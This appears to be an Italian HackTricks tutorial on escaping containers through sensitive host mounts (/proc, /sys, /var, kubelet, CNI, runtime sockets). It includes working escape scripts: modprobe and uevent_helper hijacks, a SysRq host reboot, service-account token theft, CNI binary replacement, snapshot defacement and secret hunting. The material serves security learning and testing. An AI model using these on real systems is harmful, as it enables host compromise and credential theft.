# Mount dell'host sensibili

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I mount dell'host sono una delle più importanti superfici pratiche per il container escape, perché spesso riducono una vista dei processi attentamente isolata alla visibilità diretta delle risorse dell'host. I casi pericolosi non si limitano a `/`. I bind mount di `/proc`, `/sys`, `/var`, dei runtime socket, dello stato gestito da kubelet o dei path relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container adiacenti e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine sulla protezione perché il modello di abuso è trasversale. Un mount dell'host scrivibile è pericoloso in parte a causa dei mount namespaces, in parte a causa degli user namespaces, in parte della copertura di AppArmor o SELinux e in parte del path esatto dell'host esposto. Trattarlo come argomento separato rende la superficie d'attacco molto più semplice da analizzare.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone entry di proc inattese e scrivibili può quindi portare a information disclosure, denial of service o code execution diretta sull'host.

I path procfs di alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Inizia verificando quali entry procfs di alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi path sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare path di host code-execution quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di reconnaissance per il kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto di processi, cgroup e filesystem, aiutando a ricostruire il layout dell'host dall'interno del container.

Il valore pratico di ogni path è diverso, e trattarli tutti come se avessero lo stesso impatto rende più difficile il triage:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei path procfs con il più alto impatto, perché il kernel eseguirà un pipe handler dopo un crash. Un container che può puntare `core_pattern` a un payload archiviato nel proprio overlay o in un host path montato può spesso ottenere host code execution. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo path controlla l'userspace helper utilizzato dal kernel quando deve invocare la logica di module-loading. Se scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro host code-execution primitive. È particolarmente interessante se combinato con un modo per attivare l'helper path.
- `/proc/sys/vm/panic_on_oom`
Di solito non è un escape primitive pulito, ma può trasformare la pressione sulla memoria in denial of service a livello di host, convertendo le condizioni OOM in un comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un magic value scelto e ottenere un'esecuzione nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per il kernel exploit triage. Aiuta a determinare quali subsystem, mitigations e funzionalità opzionali del kernel sono abilitate senza dover consultare i package metadata dell'host.
- `/proc/sysrq-trigger`
Principalmente un denial-of-service path, ma molto serio. Può riavviare, causare un panic o interrompere immediatamente l'host in altri modi.
- `/proc/kmsg`
Rivela i messaggi del kernel ring buffer. Utile per l'host fingerprinting, la crash analysis e, in alcuni ambienti, per fare leak di informazioni utili al kernel exploitation.
- `/proc/kallsyms`
Prezioso quando è leggibile, perché espone informazioni sui kernel symbol esportati e può aiutare a superare le assunzioni sull'address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
Questa è un'interfaccia diretta alla memoria di un processo. Se il processo target è raggiungibile con le necessarie condizioni di tipo ptrace, può consentire di leggere o modificare la memoria di un altro processo. L'impatto reale dipende fortemente da credentials, `hidepid`, Yama e dalle restrizioni ptrace, quindi è un path potente ma condizionale.
- `/proc/kcore`
Espone una vista della memoria di sistema simile a una core image. Il file è enorme e scomodo da usare, ma se è realmente leggibile indica una superficie di memoria dell'host gravemente esposta.
- `/proc/kmem` e `/proc/mem`
Interfacce raw per la memoria storicamente ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente limitate, ma se presenti e utilizzabili devono essere trattate come finding critici.
- `/proc/sched_debug`
Fa leak di informazioni sullo scheduling e sui task, che possono esporre le identità dei processi dell'host anche quando le altre viste dei processi sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove si trova realmente il container sull'host, quali path sono supportati da overlay e se un mount scrivibile corrisponde a contenuti dell'host o solo al container layer.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare l'host path del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diversi trucchi di host-execution richiedono di convertire un percorso all'interno del container nel percorso corrispondente dal punto di vista dell'host.

### Esempio completo: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il percorso dell'helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel, ma il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione dell’helper del kernel verso contenuti del percorso host controllati dall’attaccante.

### Esempio completo: ricognizione del kernel con `kallsyms`, `kmsg` e `config.gz`

Se l’obiettivo è valutare l’exploitability anziché ottenere immediatamente l’escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a stabilire se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano uno stato interessante e quali funzionalità o mitigazioni del kernel sono state compilate. L'impatto di solito non consiste in un escape diretto, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Esempio completo: riavvio dell'host tramite SysRq

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è il riavvio immediato dell'host. Non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di informazioni sullo stato del kernel e dei dispositivi. Alcuni percorsi sysfs sono principalmente utili per il fingerprinting, mentre altri possono influire sull'esecuzione degli helper, sul comportamento dei dispositivi, sulla configurazione dei moduli di sicurezza o sullo stato del firmware.

I percorsi sysfs di maggiore interesse includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono importanti per motivi diversi. `/sys/class/thermal` può influire sul comportamento della gestione termica e quindi sulla stabilità dell'host in ambienti esposti in modo inadeguato. `/sys/kernel/vmcoreinfo` può eseguire leak di informazioni sui crash dump e sul layout del kernel, utili per il fingerprinting a basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` utilizzata dai Linux Security Modules, quindi un accesso imprevisto può esporre o modificare lo stato relativo al MAC. I percorsi delle variabili EFI possono influire sulle impostazioni di boot supportate dal firmware, rendendoli molto più pericolosi dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori, con molte meno garanzie di sicurezza rispetto alle API del kernel destinate alla produzione.

I comandi utili per esaminare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti questi comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un'altra superficie LSM è visibile in un modo che avrebbe dovuto rimanere accessibile solo dall'host.
- `/sys/kernel/debug` è spesso il risultato più allarmante di questo gruppo. Se `debugfs` è montato ed è leggibile o scrivibile, aspettati un'ampia superficie a contatto con il kernel, il cui rischio esatto dipende dai nodi di debug abilitati.
- L'esposizione delle variabili EFI è meno comune, ma se presente ha un impatto elevato perché interessa impostazioni supportate dal firmware anziché normali file di runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell'host e l'interazione con l'hardware, non per una semplice escape in stile shell.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte di host-fingerprinting e crash analysis, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può eseguire un helper controllato dall'attacker quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host anziché all'interno del container corrente.

## Esposizione di `/var`

Montare `/var` dell'host in un container viene spesso sottovalutato perché non sembra così drastico come montare `/`. In pratica, può essere sufficiente per raggiungere socket di runtime, directory degli snapshot dei container, volumi dei pod gestiti da kubelet, token projected dei service account e filesystem delle applicazioni vicine. Sui nodi moderni, `/var` è spesso il punto in cui risiede effettivamente lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i token projected di altri pod e i contenuti degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché chiariscono se il mount espone soltanto dati applicativi di scarso interesse o credenziali del cluster ad alto impatto. Un token dell'account di servizio leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso all'API di Kubernetes.

Se il token è presente, verifica cosa può raggiungere invece di fermarti alla sua individuazione:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto può essere molto più ampio dell'accesso al nodo locale. Un token con RBAC ampio può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Esempio di Docker e containerd

Sugli host Docker, i dati rilevanti si trovano spesso in `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi in `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone contenuti di snapshot scrivibili di un altro workload, l'attaccante potrebbe riuscire a modificare i file dell'applicazione, inserire contenuti web o modificare gli script di avvio senza toccare la configurazione del container corrente.

Idee concrete di abuso una volta individuati contenuti di snapshot scrivibili:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto di `/var` montato: manomissione delle applicazioni, recupero di secret e lateral movement verso workload adiacenti.

## Kubelet State, Plugins And CNI Paths

Un mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` è spesso esposto tramite DaemonSets privilegiati, agent CNI, plugin CSI dei nodi, operatori GPU e helper per lo storage. Questi mount sono facili da liquidare come semplice "infrastruttura del nodo", ma si trovano direttamente nel percorso di esecuzione dei nuovi pod e spesso contengono credenziali kubelet, secret proiettati, socket di registrazione e binari eseguibili dei plugin lato host.

Gli obiettivi di maggior valore includono:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

I comandi di revisione utili sono:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Perché questi percorsi sono importanti:

- `/var/lib/kubelet/pki` può esporre i certificati client del kubelet e altre credenziali locali del nodo, che talvolta possono essere riutilizzate contro l'API server o gli endpoint TLS esposti dal kubelet, a seconda del design del cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` contiene spesso token projected di service-account e Secrets montati per i pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è principalmente una superficie di reconnaissance, ma molto utile: rivela quali pod e container possiedono attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali del nodo scarse.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali plugin CSI, DRA e device plugin sono installati e con quali socket il kubelet dovrebbe comunicare. Se queste directory sono scrivibili anziché soltanto leggibili, il finding diventa molto più serio.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente nel percorso di configurazione della rete dei pod. L'accesso in scrittura è spesso una primitiva di esecuzione ritardata sull'host, non una semplice esposizione della configurazione.<sup>[[2]](#references)</sup>

### Esempio completo: `/opt/cni/bin` scrivibile

Se una directory host contenente i binari CNI è montata in lettura-scrittura, sostituire un plugin può essere sufficiente per ottenere l'esecuzione sull'host la volta successiva che il kubelet crea un pod sandbox su quel nodo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Non è immediato quanto un `docker.sock` montato, ma è spesso più realistico nei pod infrastrutturali Kubernetes compromessi. Il punto importante è che il binary modificato viene successivamente eseguito dal flusso di configurazione della rete dell'host, non dal container corrente.

## Socket di runtime

I mount sensibili dell'host includono spesso socket di runtime anziché directory complete. Sono così importanti da meritare di essere ribaditi esplicitamente qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi di exploitation completi una volta montato uno di questi socket.

Come rapido schema di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste operazioni va a buon fine, il percorso da "mounted socket" a "start a more privileged sibling container" è solitamente molto più breve rispetto a qualsiasi percorso di kernel breakout.

## Writable Host Path Task Hijack

Un writable host mount non deve necessariamente esporre `/` per essere pericoloso. Se il percorso montato contiene script, file di configurazione, hook, plugin o file utilizzati successivamente da un'attività pianificata o da un servizio eseguito sul lato host, il container potrebbe essere in grado di modificare ciò che l'host esegue.

Flusso di revisione generico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se un file scrivibile viene utilizzato da un processo host, mantieni il payload semplice e osservabile durante i test:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La parte interessante è il trust boundary: la scrittura avviene dall'interno del container, ma l'esecuzione avviene successivamente nel contesto del servizio host. Questo trasforma un hostPath o bind mount limitato in una primitiva di esecuzione ritardata di codice sull'host.

## CVE relativi ai mount

I mount dell'host possono inoltre interagire con le vulnerabilità del runtime. Tra gli esempi recenti più importanti:

- `CVE-2024-21626` in `runc`, dove un file descriptor di directory esposto poteva collocare la directory di lavoro sul filesystem dell'host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, dove Dockerfile e frontend malevoli, oltre ai flussi `RUN --mount`, potevano reintrodurre l'accesso ai file dell'host, la loro eliminazione o privilegi elevati durante le build.
- `CVE-2024-1753` nei flussi di build di Buildah e Podman, dove bind mount appositamente creati durante la build potevano esporre `/` in lettura e scrittura.
- `CVE-2025-47290` in `containerd` 2.1.0, dove una race condition TOCTOU durante l'unpack di un'immagine poteva consentire a un'immagine appositamente creata di modificare il filesystem dell'host durante il pull.

Queste CVE sono rilevanti in questo contesto perché dimostrano che la gestione dei mount non riguarda soltanto la configurazione da parte dell'operatore. Anche il runtime può introdurre condizioni di escape basate sui mount.

## Verifiche

Usa questi comandi per individuare rapidamente le esposizioni ai mount di maggiore valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Cosa è interessante qui:

- La root dell'host, `/proc`, `/sys`, `/var` e i runtime socket sono tutti risultati ad alta priorità.
- Le voci di proc/sys scrivibili spesso indicano che il mount espone controlli del kernel globali dell'host invece di una vista sicura del container.
- I percorsi `/var` montati richiedono una revisione delle credenziali e dei workload adiacenti, non solo del filesystem.
- Le directory di stato di Kubelet e i percorsi CNI/plugin meritano la stessa priorità dei runtime socket, perché spesso si trovano direttamente nel percorso di creazione dei pod e distribuzione delle credenziali del nodo.

## Riferimenti

- [1] [File e percorsi locali utilizzati da Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Il container cilium-agent può accedere all'host tramite un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
